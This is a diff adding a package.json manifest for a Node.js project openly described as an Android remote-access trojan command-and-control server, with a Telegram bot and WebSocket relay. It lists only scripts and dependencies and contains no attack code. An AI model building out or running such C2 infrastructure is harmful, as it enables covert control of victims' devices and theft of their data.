@@ -1,0 +1,27 @@
+{
+  "name": "android-rat-c2",
+  "version": "1.0.0",
+  "description": "Advanced Android RAT C2 Server - Telegram Bot + WebSocket Relay",
+  "main": "src/index.js",
+  "scripts": {
+    "start": "node src/index.js",
+    "dev": "node --watch src/index.js",
+    "test": "node tests/test-server.js"
+  },
+  "dependencies": {
+    "express": "^4.21.0",
+    "ws": "^8.18.0",
+    "better-sqlite3": "^11.3.0",
+    "node-telegram-bot-api": "^0.66.0",
+    "dotenv": "^16.4.5",
+    "uuid": "^10.0.0",
+    "multer": "^1.4.5-lts.1",
+    "cors": "^2.8.5",
+    "morgan": "^1.10.0",
+    "helmet": "^8.0.0",
+    "express-rate-limit": "^7.4.0"
+  },
+  "engines": {
+    "node": ">=18.0.0"
+  }
+}
